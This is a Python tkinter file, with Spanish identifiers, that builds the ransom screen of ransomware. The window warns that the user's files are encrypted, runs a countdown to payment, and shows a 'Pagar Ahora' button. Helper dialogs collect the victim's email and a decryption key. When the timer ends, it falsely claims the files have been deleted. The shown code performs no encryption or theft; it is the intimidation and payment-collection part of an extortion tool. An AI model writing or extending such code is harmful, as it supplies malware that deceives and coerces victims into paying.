import tkinter as tk
from tkinter import simpledialog, messagebox
import threading
import time

class VentanaAtaque:
    def __init__(self, tiempo_limite=60, callback_pago=None):
        self.tiempo_restante = tiempo_limite
        self.callback_pago = callback_pago

        self.ventana = tk.Tk()
        self.ventana.title("⚠️ Alerta de Seguridad")
        self.ventana.geometry("420x270")
        self.ventana.config(bg="#222")  # Fondo oscuro
        self.ventana.resizable(False, False)

        self.label_mensaje = tk.Label(self.ventana,
            text="¡Se ha detectado un ataque!\nTus archivos han sido cifrados.",
            font=("Arial", 14), fg="red", bg="#222", justify="center")
        self.label_mensaje.pack(pady=20)

        self.label_tiempo = tk.Label(self.ventana,
            text="Tiempo restante para pagar:",
            font=("Arial", 12), bg="#222", fg="white")
        self.label_tiempo.pack()

        self.tiempo_var = tk.StringVar()
        self.tiempo_var.set(self.formato_tiempo(self.tiempo_restante))
        self.label_contador = tk.Label(self.ventana, textvariable=self.tiempo_var,
            font=("Arial", 18, "bold"), fg="yellow", bg="#222")
        self.label_contador.pack(pady=5)

        self.boton_pagar = tk.Button(self.ventana,
            text="Pagar Ahora", font=("Arial", 12), bg="green", fg="white",
            command=self.pagar)
        self.boton_pagar.pack(pady=10)

        self.contador_activo = True
        threading.Thread(target=self.contador_regresivo, daemon=True).start()
        self.ventana.mainloop()

    def formato_tiempo(self, segundos):
        minutos = segundos // 60
        seg = segundos % 60
        return f"{minutos:02d}:{seg:02d}"

    def contador_regresivo(self):
        while self.tiempo_restante > 0 and self.contador_activo:
            time.sleep(1)
            self.tiempo_restante -= 1
            self.tiempo_var.set(self.formato_tiempo(self.tiempo_restante))
        if self.tiempo_restante == 0:
            messagebox.showerror("Tiempo agotado", "El tiempo ha terminado. Los archivos han sido eliminados.")
            self.ventana.destroy()

    def pagar(self):
        self.contador_activo = False
        self.ventana.destroy()
        if self.callback_pago:
            self.callback_pago()

def pedir_correos_y_mostrar():
    root = tk.Tk()
    root.withdraw()
    correo_victima = simpledialog.askstring("Correo de recuperación", "Introduce tu correo para recibir la clave:")
    #correo_backup = simpledialog.askstring("Correo de seguridad", "Introduce correo de respaldo:")
    root.destroy()
    return correo_victima#, correo_backup

def pedir_clave():
    root = tk.Tk()
    root.withdraw()
    clave = simpledialog.askstring("Clave de desencriptado", "Introduce la clave recibida por correo:")
    root.destroy()
    return clave

def mostrar_mensaje(titulo, texto):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo(titulo, texto)
    root.destroy()
